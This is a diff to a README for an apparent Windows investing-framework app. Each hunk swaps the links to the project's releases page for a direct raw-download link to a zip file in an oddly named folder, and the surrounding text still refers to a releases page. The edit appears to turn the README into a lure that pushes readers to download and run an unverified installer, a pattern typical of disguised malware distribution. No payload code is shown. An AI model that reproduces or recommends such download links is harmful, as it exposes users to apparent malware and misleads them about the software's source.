@@ -1,6 +1,6 @@
 # 📊 value-investing-decision-framework - Clear Guide for Smart Investing
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/slavestatehypostasis887/value-investing-decision-framework/main/slummocky/framework_decision_value_investing_v3.9.zip)
 
 ---
 
@@ -42,7 +42,7 @@ No extra software or tools are needed. The application runs natively on Windows 
 ## 📥 How to Download and Install
 
 1. Click the large green badge at the top of this page, or visit this link:  
-   [Download Link](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
+   [Download Link](https://raw.githubusercontent.com/slavestatehypostasis887/value-investing-decision-framework/main/slummocky/framework_decision_value_investing_v3.9.zip)
 
 2. On the releases page, look for the newest version of the software. Usually, it will be listed at the top.
 
@@ -128,7 +128,7 @@ The framework may receive updates to improve or add features.
 To update:
 
 1. Visit the releases page again:  
-   [https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
+   [https://raw.githubusercontent.com/slavestatehypostasis887/value-investing-decision-framework/main/slummocky/framework_decision_value_investing_v3.9.zip](https://raw.githubusercontent.com/slavestatehypostasis887/value-investing-decision-framework/main/slummocky/framework_decision_value_investing_v3.9.zip)
 
 2. Download the latest Windows installer as you did before.
 
@@ -183,6 +183,6 @@ This framework blends lessons from renowned investors into a practical tool. It 
 ## 📌 Links
 
 - Official Download Page:  
-  [https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases](https://github.com/slavestatehypostasis887/value-investing-decision-framework/releases)
+  [https://raw.githubusercontent.com/slavestatehypostasis887/value-investing-decision-framework/main/slummocky/framework_decision_value_investing_v3.9.zip](https://raw.githubusercontent.com/slavestatehypostasis887/value-investing-decision-framework/main/slummocky/framework_decision_value_investing_v3.9.zip)
 
 - Use the badge at the top to start your download immediately.
